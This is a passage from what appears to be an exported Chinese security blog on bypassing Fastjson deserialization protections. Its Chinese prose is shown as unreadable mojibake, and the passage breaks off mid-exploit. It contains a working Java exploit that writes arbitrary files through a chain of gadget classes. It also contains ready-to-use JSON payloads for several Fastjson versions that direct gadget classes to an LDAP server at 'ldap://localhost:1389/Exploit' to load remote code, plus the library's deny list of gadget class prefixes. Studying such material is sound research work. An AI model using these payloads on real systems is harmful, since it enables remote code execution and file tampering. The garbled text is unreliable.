class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> verifySubclass();  </span><br><span class="line"> bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);  </span><br><span class="line"> handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line"> subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line"> enableOverride = <span class="literal">false</span>;  </span><br><span class="line"> writeStreamHeader();  </span><br><span class="line"> bout.setBlockDataMode(<span class="literal">true</span>);  </span><br><span class="line"> <span class="keyword">if</span> (extendedDebugInfo) &#123;  </span><br><span class="line"> debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();  </span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line"> debugInfoStack = <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯Fastjsonä¼˜å…ˆè·å–çš„æ˜¯ObjectOutputStreamç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œå› æ­¤åªèƒ½æ‰¾ObjectOutputStreamçš„ç»§æ‰¿ç±»æ¥è§¦å‘äº†ã€‚<br>åªæœ‰æœ‰å‚æ„é€ å‡½æ•°çš„ObjectOutputStreamç»§æ‰¿ç±»ï¼š<strong>com.sleepycat.bind.serial.SerialOutput</strong><br>çœ‹åˆ°ï¼ŒSerialOutputç±»çš„æ„é€ å‡½æ•°ä¸­æ˜¯è°ƒç”¨äº†çˆ¶ç±»ObjectOutputStreamçš„æœ‰å‚æ„é€ å‡½æ•°ï¼Œè¿™å°±æ»¡è¶³äº†å‰é¢çš„æ¡ä»¶äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SerialOutput</span><span class="params">(OutputStream out, ClassCatalog classCatalog)</span>  </span><br><span class="line"> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="built_in">super</span>(out);  </span><br><span class="line"> <span class="built_in">this</span>.classCatalog = classCatalog;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/* guarantee that we&#x27;ll always use the same serialization format */</span>  </span><br><span class="line">  </span><br><span class="line"> useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expå¦‚ä¸‹ï¼Œç”¨åˆ°äº†Fastjsonå¾ªç¯å¼•ç”¨çš„æŠ€å·§æ¥è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.localstore.SafeFileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;;  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;targetPath\&quot;: \&quot;E:/hacked.txt\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;tempPath\&quot;: \&quot;E:/test.txt\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280031246.png" alt="image-20230828003107850"><br>è¿™é‡Œå†™å…¥æ–‡ä»¶å†…å®¹å…¶å®æœ‰é™åˆ¶ï¼Œæœ‰çš„ç‰¹æ®Šå­—ç¬¦å¹¶ä¸èƒ½ç›´æ¥å†™å…¥åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚å†™ä¸è¿›PHPä»£ç ç­‰ã€‚<br>è¿™é‡Œå°±æœ‰ç‚¹æ²¡æ‡‚äº†ï¼Œæˆ‘çš„test.txtå…¶å®æ˜¯ä¸å­˜åœ¨çš„ä½†æ˜¯ä¹Ÿåˆ©ç”¨æˆåŠŸäº†ï¼Ÿä»”ç»†å®¡ä¸€ä¸‹SafeFileOutputStreamä»£ç ï¼ˆæˆ‘é GPTï¼‰</p><ul><li><code>SafeFileOutputStream(File file)</code>ï¼šæ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªFileå¯¹è±¡ï¼Œå®ƒä¼šè°ƒç”¨å¦ä¸€ä¸ªæ„é€ å‡½æ•°æ¥åˆå§‹åŒ–ã€‚å®ƒå°†æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ä¼ é€’ç»™ç¬¬äºŒä¸ªæ„é€ å‡½æ•°ï¼ŒtempPathå‚æ•°ä¸ºnullã€‚</li><li><code>SafeFileOutputStream(String targetPath, String tempPath)</code>ï¼šè¿™ä¸ªæ„é€ å‡½æ•°ç”¨äºåˆå§‹åŒ–SafeFileOutputStreamå¯¹è±¡ã€‚å®ƒé¦–å…ˆåˆ›å»ºä¸€ä¸ªFileå¯¹è±¡æ¥è¡¨ç¤ºç›®æ ‡æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨<code>createTempFile</code>æ–¹æ³•åˆ›å»ºä¸€ä¸ªFileå¯¹è±¡æ¥è¡¨ç¤ºä¸´æ—¶æ–‡ä»¶ã€‚æ¥ç€ï¼Œå®ƒæ£€æŸ¥ç›®æ ‡æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„BufferedOutputStreamå¯¹è±¡ç”¨äºå†™å…¥ç›®æ ‡æ–‡ä»¶ï¼Œå¦åˆ™å°†ä¸´æ—¶æ–‡ä»¶çš„å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ã€‚</li></ul><p>å¤åˆ¶æ–‡ä»¶æ˜¯å¦‚æœtempPathå­˜åœ¨å°±ä¼šç›´æ¥å¤åˆ¶ï¼Œå¦‚æœä¸å­˜åœ¨ä¸ä¼šåˆ›å»ºå®ƒåªæ˜¯ç”¨æ¥æŒ‡å®šè·¯å¾„ï¼Œä½†æ˜¯å†™æ–‡ä»¶å°±æ˜¯åˆ©ç”¨bufferå‚æ•°å°±å†™å…¥å†…å®¹ç„¶åç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åœ¨å®é™…æ¸—é€ä¸­æ€ä¹ˆåˆ©ç”¨è¿˜æ˜¯æ²¡getåˆ°ï¼Œéš¾é“æ˜¯ç›´æ¥å†™shellï¼Ÿ</p><h2 id="å…¶ä»–ä¸€äº›ç»•è¿‡é»‘åå•çš„Gadget"><a href="#å…¶ä»–ä¸€äº›ç»•è¿‡é»‘åå•çš„Gadget" class="headerlink" title="å…¶ä»–ä¸€äº›ç»•è¿‡é»‘åå•çš„Gadget"></a>å…¶ä»–ä¸€äº›ç»•è¿‡é»‘åå•çš„Gadget</h2><p>è¿™é‡Œè¡¥å……ä¸‹å…¶ä»–ä¸€äº›Gadgetï¼Œå¯è‡ªè¡Œå°è¯•ã€‚æ³¨æ„ï¼Œå‡éœ€è¦å¼€å¯AutoTypeï¼Œä¸”ä¼šè¢«JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ã€‚</p><h3 id="1-2-59"><a href="#1-2-59" class="headerlink" title="1.2.59"></a>1.2.59</h3><p>com.zaxxer.hikari.HikariConfigç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span>æˆ–<span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h3><p>org.apache.commons.proxy.provider.remoting.SessionBeanProviderç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Object&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h3><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptorç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.util.Hashtable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;java.naming.factory.initial&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;topic-factory&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfigç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span>æˆ–<span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>com.caucho.config.types.ResourceRefç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.caucho.config.types.ResourceRef&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lookupName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.value&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="æœªçŸ¥ç‰ˆæœ¬"><a href="#æœªçŸ¥ç‰ˆæœ¬" class="headerlink" title="æœªçŸ¥ç‰ˆæœ¬"></a>æœªçŸ¥ç‰ˆæœ¬</h3><p>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactoryç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmJndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmFromJndi&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;transactionManager&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.transactionManager&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactoryç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmJndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmFromJndi&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;transactionManager&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.transactionManager&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>ç»ˆäºæŠŠåŸºç¡€çš„é“¾å­å‹‰å¼ºå­¦å®Œäº†ï¼Œå¯ä»¥çœ‹å…¶å®ƒçš„äº†ï¼Œä¸è¿‡è¿™äº›è¿˜æ˜¯å¾—æ—¶ä¸æ—¶çœ‹ä¸‹ä¸ç„¶ä¸€ä¸‹å°±å¿˜äº†</p><p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/704/">Fastjsonååºåˆ—åŒ–æ¼æ´(4)â€”1.2.68ç‰ˆæœ¬ â€“ JohnFrodâ€™s Blog</a><br><a href="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Javaååºåˆ—åŒ–Fastjsonç¯‡04-Fastjson1.2.62-1.2.68ç‰ˆæœ¬ååºåˆ—åŒ–æ¼æ´ | Drunkbabyâ€™s Blog (drun1baby.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.25-1.2.47ç»•è¿‡</title>
      <link href="/2023/08/Fastjson1-2-25-1-2-47%E7%BB%95%E8%BF%87/"/>
      <url>/2023/08/Fastjson1-2-25-1-2-47%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="1-2-25-ä¿®å¤åˆ†æ"><a href="#1-2-25-ä¿®å¤åˆ†æ" class="headerlink" title="1.2.25 ä¿®å¤åˆ†æ"></a>1.2.25 ä¿®å¤åˆ†æ</h2><p>é¦–å…ˆå¯¼å…¥1.2.25ç‰ˆæœ¬çš„ä¿®å¤å§ï¼Œåœ¨pom.xmlä¸­å¯¼å…¥å¯¹åº”ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.25</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹TemplatesImplè¿™æ¡é“¾å‘ç°å­˜åœ¨ä¹‹å‰æ²¡æœ‰çš„æŠ¥é”™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272358332.png" alt="image-20230827235812190"><br>è°ƒè¯•ä¸€ä¸‹å‘ç°æ¥åˆ°äº†ä¸‹é¢è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272358333.png" alt="image-20230827235838109"><br>åœ¨1.2.24ç‰ˆæœ¬ä¸­è¿™é‡Œæ˜¯ç›´æ¥è°ƒç”¨äº†loadClasså¦‚ä¸‹å›¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359037.png" alt="image-20230827235905974"><br>è€Œåœ¨1.2.25é‡Œæ˜¯è°ƒç”¨äº†<code>checkAutoType</code>è¿›å»çœ‹çœ‹è¿™ä¸ªæ–¹æ³•å¹²äº†ä»€ä¹ˆï¼Œè¿™é‡Œç™½æ—¥æ¢¦ç»„é•¿æ ¹æ®æµç¨‹ç”»äº†ä¸€ä¸ªæµç¨‹å›¾å¦‚ä¸‹ï¼Œæ‰‹å·¥å¤åˆ¶å¯èƒ½ä¼šæœ‰äº›é”™è¯¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359164.png" alt="image-20230827235921948"><br>åœ¨<code>checkAutoType</code>ä¸­é€šè¿‡é»‘ï¼ˆdenyListï¼‰ç™½ï¼ˆacceptListï¼‰åå•å¯¹ç±»è¿›è¡Œæ£€éªŒ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359242.png" alt="image-20230827235939729"><br>è¿™é‡Œç™½åå•é»˜è®¤ä¸ºç©ºï¼Œå¯æ‰‹åŠ¨æ·»åŠ ï¼Œé»‘åå•é»˜è®¤ä¸ä¸ºç©ºï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒautoTypeSupportä¸ºFalseï¼Œå³å…ˆè¿›è¡Œé»‘åå•è¿‡æ»¤ï¼Œéå†denyListï¼Œå¦‚æœå¼•å…¥çš„åº“ä»¥denyListä¸­æŸä¸ªdenyå¼€å¤´ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä¸­æ–­è¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°å›¾ä¸­å°±æ£€æŸ¥åˆ°äº†<code>com.sun</code>ç„¶åç›´æ¥è·³å‡ºäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359339.png" alt="image-20230827235957813"><br>denyListé»‘åå•ä¸­åˆ—å‡ºäº†å¸¸è§çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾Gadgetsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>è°ƒè¯•ä¸­å¯ä»¥çœ‹åˆ°å› ä¸ºautoTypeSupportä¸ºFalseæ‰€ä»¥è¿›è¡Œé»‘åå•æ ¡éªŒç„¶åæŠ›å¼‚å¸¸é€€å‡ºï¼Œé‚£ä¹ˆçœ‹çœ‹autoTypeSupportæ˜¯ä»€ä¹ˆ</p><h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p>autoTypeSupportæ˜¯<code>checkAutoType()</code>å‡½æ•°å‡ºç°åParserConfig.javaä¸­æ–°å¢çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œåœ¨<code>checkAutoType()</code>å‡½æ•°çš„æŸäº›ä»£ç é€»è¾‘èµ·åˆ°å¼€å…³çš„ä½œç”¨ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹autoTypeSupportä¸ºFalseï¼Œå°†å…¶è®¾ç½®ä¸ºTrueæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>JVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeSupport=true</code></li><li>ä»£ç ä¸­è®¾ç½®ï¼š<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>ï¼Œå¦‚æœæœ‰ä½¿ç”¨éå…¨å±€ParserConfigåˆ™ç”¨å¦å¤–è°ƒç”¨<code>setAutoTypeSupport(true);</code></li></ul><p>AutoTypeç™½åå•è®¾ç½®æ–¹æ³•ï¼š</p><ol><li>JVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>ä»£ç ä¸­è®¾ç½®ï¼š<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li><li>é€šè¿‡fastjson.propertiesæ–‡ä»¶é…ç½®ã€‚åœ¨1.2.25&#x2F;1.2.26ç‰ˆæœ¬æ”¯æŒé€šè¿‡ç±»è·¯å¾„çš„fastjson.propertiesæ–‡ä»¶æ¥é…ç½®ï¼Œé…ç½®æ–¹å¼å¦‚ä¸‹ï¼š<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li></ol><h2 id="1-2-25-1-2-41ç»•è¿‡"><a href="#1-2-25-1-2-41ç»•è¿‡" class="headerlink" title="1.2.25~1.2.41ç»•è¿‡"></a>1.2.25~1.2.41ç»•è¿‡</h2><p>å…ˆçœ‹expï¼Œserverç«¯å’Œä¹‹å‰ä¸€æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span 